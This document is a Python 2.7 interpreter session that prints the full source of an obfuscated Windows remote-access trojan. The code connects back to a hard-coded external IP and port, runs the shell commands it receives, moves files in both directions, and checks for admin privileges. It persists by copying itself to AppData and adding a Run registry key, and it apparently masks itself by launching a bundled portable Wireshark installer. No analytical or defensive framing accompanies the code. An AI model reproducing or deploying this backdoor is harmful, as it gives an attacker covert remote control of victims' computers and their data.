Python 2.7.17 (v2.7.17:c2f86d86e6, Oct 19 2019, 21:01:17) [MSC v.1500 64 bit (AMD64)] on win32
Type "help", "copyright", "credits" or "license()" for more information.
>>> 
=========== RESTART: C:\Users\Administrator\Desktop\fresh1gzip.py ===========
#!usr/bin/python
var2=True
var3=ValueError
var4=len
var5=open
import socket
var6=socket.socket
var7=socket.AF_INET
var8=socket.SOCK_STREAM
import subprocess
var9=subprocess.call
var10=subprocess.PIPE
var11=subprocess.Popen
import json
var12=json.dumps
var13=json.loads
import os
var14=os.path
var15=os.environ
var16=os.getenv
var17=os.listdir
var18=os.chdir
var19=os.sep
import base64
var20=base64.b64decode
var21=base64.b64encode
import shutil
var22=shutil.copyfile
import sys
var23=sys.executable
var24=sys._MEIPASS
import time
var25=time.sleep
var25(10)
def method1(JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhezR):
 var26=var12(JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhezR)
 s.send(var26)
def JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemR():
 var27=""
 while var2:
  try:
   var27=var27+s.recv(1024)
   return var13(var27)
  except var3:
   continue
def JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemF():
 global JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhezK
 try:
  var28=var17(var19.join([var16('SystemRoot','c:\windows'),'temp']))
 except:
  var29="[!!] User Privileges!"
 else:
  var29="[+]Admin Privileges!"
def JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemK():
 while var2:
  var25(15)
  try:
   s.connect(("193.161.193.99",43011))
   JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemg()
  except:
   JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemK()
def JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemg():
 while var2:
  var30=JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemR()
  if var30=='q':
   break
  elif var30[:2]=="cd" and var4(var30)>1:
   try:
    var18(var30[3:])
   except:
    continue
  elif var30[:8]=="download":
   with var5(var30[9:],"rb")as JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOheFK:
    method1(var21(JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOheFK.read()))
  elif var30[:6]=="upload":
   with var5(var30[7:],"wb")as fin:
    var31=JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemR()
    fin.write(var20(var31))
  elif var30[:5]=="check":
   try:
    JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemF()
    method1(var29)
   except:
    method1("Can't Perform the CHECK")
  else:
   var32=var11(var30,shell=var2,stdout=var10,stderr=var10,stdin=var10)
   var33=var32.stdout.read()+var32.stderr.read()
   method1(var33)
var34=var15["appdata"]+"\\windowsx64.exe"
if not var14.exists(var34):
 var22(var23,var34)
 var9('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windowsx32 /t REG_SZ /d "'+var34+'"',shell=var2)
 var35=var24+"\WiresharkPortable64_3.6.5.paf.exe"
 try:
  var11(var35,shell=var2)
 except:
  var36=1
  var37=2
  var38=var36+var37
s=var6(var7,var8)
JUsStMGvYNjoHkpyPLbWTfcdBqECxQnVIlOhemK()
s.close()

>>> 
